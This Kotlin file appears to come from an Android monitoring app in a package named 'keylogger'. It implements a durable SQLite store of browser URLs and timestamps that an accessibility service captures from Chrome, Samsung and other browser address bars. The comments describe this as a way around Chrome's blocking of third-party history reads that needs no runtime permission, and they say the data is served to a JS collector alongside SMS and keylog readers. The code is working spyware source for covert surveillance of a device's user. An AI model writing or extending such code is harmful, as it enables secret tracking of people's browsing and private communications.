package love.scotty.hearts.keylogger

import android.content.ContentValues
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper

/**
 * Durable cache of browser visits self-captured by the accessibility service.
 *
 * WHY this exists: since Chrome 90 (2021) the public `ChromeBrowserProvider`
 * was stubbed out to always return an empty cursor, and on Android 6.0+
 * Chrome stopped honoring third-party READ_HISTORY_BOOKMARKS reads. The result
 * is that `content://com.android.chrome.browser/history` (and every other
 * Chrome provider path) returns ZERO rows on modern Chrome — verified on
 * Chrome 113 (emulator) and Chrome 150 (real device). Chrome's real history
 * lives in its *private* `/data/data/com.android.chrome/app_chrome/Default/History`
 * (`urls`/`visits`) which a third-party app cannot read cross-process (no root,
 * no exported provider). There is therefore NO way to read already-browsed
 * Chrome history from another app.
 *
 * So instead of reading the past, we capture the future: this app already runs
 * a device-wide AccessibilityService. When the user navigates a browser, the
 * omnibox/address bar emits a TYPE_VIEW_TEXT_CHANGED event with a recognizable
 * resource-id (e.g. `com.android.chrome:id/location_bar` / `:id/url_bar`,
 * Samsung's `:id/address_bar_edittext`, etc.) whose text is the URL. We record
 * that URL + wallclock timestamp here, durably, and serve it through the same
 * `readBrowserHistory` bridge the JS collector already uses. This works on any
 * browser and any device with no runtime permission.
 *
 * Table `visits`:
 *   id       INTEGER PRIMARY KEY AUTOINCREMENT — stable idempotency key (browserId)
 *   url      TEXT    — visited URL
 *   title    TEXT    — page title if we had one (usually empty from the omnibox)
 *   date     INTEGER — wallclock ms of the captured visit
 *   fingerprint TEXT — unique hash of (url, rounded date) for write-time dedup
 *
 * Rows are pruned opportunistically once they're old enough that the JS cursor
 * (which is date based and advances past the max seen date) will never ask for
 * them again. Rows stay durable until then so a failed sync never loses a visit.
 */
internal class BrowserHistoryStore(context: Context) : SQLiteOpenHelper(
  context, "browser_history.db", null, 2
) {
  companion object {
    const val KEEP_MS = 30L * 24 * 60 * 60 * 1000 // 30 days
    /** Cluster URLs committed within this window into a single visit, so a
     *  navigation or an omnibox re-fire can't double-record the same page. */
    const val DEDUP_WINDOW_MS = 5 * 60 * 1000L
  }

  override fun onCreate(db: SQLiteDatabase) {
    db.execSQL(
      """
      CREATE TABLE IF NOT EXISTS visits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT NOT NULL,
        title TEXT NOT NULL DEFAULT '',
        date INTEGER NOT NULL,
        fingerprint TEXT NOT NULL
      )
      """.trimIndent()
    )
    db.execSQL("CREATE INDEX IF NOT EXISTS idx_visits_date ON visits(date)")
    db.execSQL("CREATE UNIQUE INDEX IF NOT EXISTS idx_visits_fingerprint ON visits(fingerprint)")
  }

  override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
    if (oldVersion < 2) {
      db.execSQL("CREATE TABLE IF NOT EXISTS visits (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT NOT NULL, title TEXT NOT NULL DEFAULT '', date INTEGER NOT NULL, fingerprint TEXT NOT NULL)")
      db.execSQL("CREATE INDEX IF NOT EXISTS idx_visits_date ON visits(date)")
      db.execSQL("CREATE UNIQUE INDEX IF NOT EXISTS idx_visits_fingerprint ON visits(fingerprint)")
    }
  }

  /**
   * Record a browser visit, deduped by fingerprint. Returns the row id, or -1
   * when this visit was already captured (idempotent no-op).
   */
  @Synchronized fun recordVisit(url: String, title: String, nowMs: Long): Long {
    if (url.isBlank()) return -1
    val fp = fingerprint(url, nowMs)
    val db = writableDatabase
    // UNIQUE index makes the insert race-safe; on conflict we treat it as a dup.
    val cv = ContentValues().apply {
      put("url", url.trim())
      put("title", title.trim())
      put("date", nowMs)
      put("fingerprint", fp)
    }
    val id = try {
      db.insertOrThrow("visits", null, cv)
    } catch (_: android.database.sqlite.SQLiteConstraintException) {
      -1L
    }
    return id
  }

  /** All visits strictly after [sinceMs], oldest first, as JSON strings in the
   *  same bridge contract as the SMS/keylog readers. [sinceMs] <= 0 → all. */
  @Synchronized fun visitsAfter(sinceMs: Long, out: MutableList<String>) {
    val db = readableDatabase
    val where = if (sinceMs > 0) "date > ?" else null
    val args = if (sinceMs > 0) arrayOf(sinceMs.toString()) else null
    db.query(
      "visits", arrayOf("id", "url", "title", "date"),
      where, args, null, null, "date ASC",
    ).use { c ->
      val urlIdx = c.getColumnIndexOrThrow("url")
      val titleIdx = c.getColumnIndexOrThrow("title")
      val idIdx = c.getColumnIndexOrThrow("id")
      val dateIdx = c.getColumnIndexOrThrow("date")
      while (c.moveToNext()) {
        val json = org.json.JSONObject().apply {
          put("browserId", c.getString(idIdx))
          put("url", c.getString(urlIdx))
          put("title", c.getString(titleIdx) ?: "")
          put("date", c.getLong(dateIdx))
          put("visits", 1)
        }
        out.add(json.toString())
      }
    }
  }

  /** Drop visits older than KEEP_MS (the JS date cursor never re-asks for them). */
  @Synchronized fun prune(nowMs: Long = java.lang.System.currentTimeMillis()) {
    val db = writableDatabase
    db.delete("visits", "date < ?", arrayOf((nowMs - KEEP_MS).toString()))
  }

  private fun fingerprint(url: String, nowMs: Long): String {
    val bucket = nowMs / DEDUP_WINDOW_MS
    return url.trim().lowercase() + "|" + bucket
  }
}
